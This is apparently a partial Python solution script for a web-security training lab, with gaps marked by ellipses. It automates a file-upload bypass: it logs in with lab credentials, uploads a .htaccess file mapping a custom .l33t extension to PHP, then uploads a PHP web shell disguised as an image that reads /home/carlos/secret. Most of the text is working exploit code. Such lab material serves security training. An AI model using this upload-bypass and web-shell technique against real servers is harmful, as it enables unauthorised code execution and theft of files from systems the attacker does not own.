"""
    ...
    This lab contains a vulnerable image upload function. The server attempts to block dangerous file extensions, but this restriction can be bypassed using a .htaccess file.
    To solve the lab, upload a .htaccess file to map a custom extension to PHP, then upload a PHP web shell with the custom extension. Use the web shell to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
    You can log in to your own account using the following credentials: wiener:peter

    Exploit Steps:
    1. Log in to the application using the provided credentials.
    2. Upload a .htaccess file to map a custom extension (.l33t) to PHP.
    3. Upload a PHP web shell with the .l33t extension.
...
def main():
    ...
    print(f"{Fore.YELLOW}[*] Uploading .htaccess file...{Fore.RESET}")
    csrf_token = get_csrf(session, "/my-account")
    htaccess_content = b"AddType application/x-httpd-php .l33t"
    files = {
        "avatar": (".htaccess", htaccess_content, "text/plain")
    }
    data = {
        "csrf": csrf_token,
        "user": "wiener"
    ...
    if r.status_code != 200:
        print(f"{Fore.RED}[-] .htaccess upload failed{Fore.RESET}")
        return
    print(f"{Fore.GREEN}[+] Uploaded .htaccess file{Fore.RESET}")

    print(f"{Fore.YELLOW}[*] Uploading PHP web shell...{Fore.RESET}")
    php_shell_content = b"<?php echo file_get_contents('/home/carlos/secret'); ?>"
    files = {
        "avatar": ("exploit.l33t", php_shell_content, "image/jpeg")
    }
    r = session.post(f"{URL}/my-account/avatar", files=files, data=data, allow_redirects=True)
    if r.status_code != 200:
    ...
    r = session.get(f"{URL}/files/avatars/exploit.l33t")
    secret = r.text.strip()
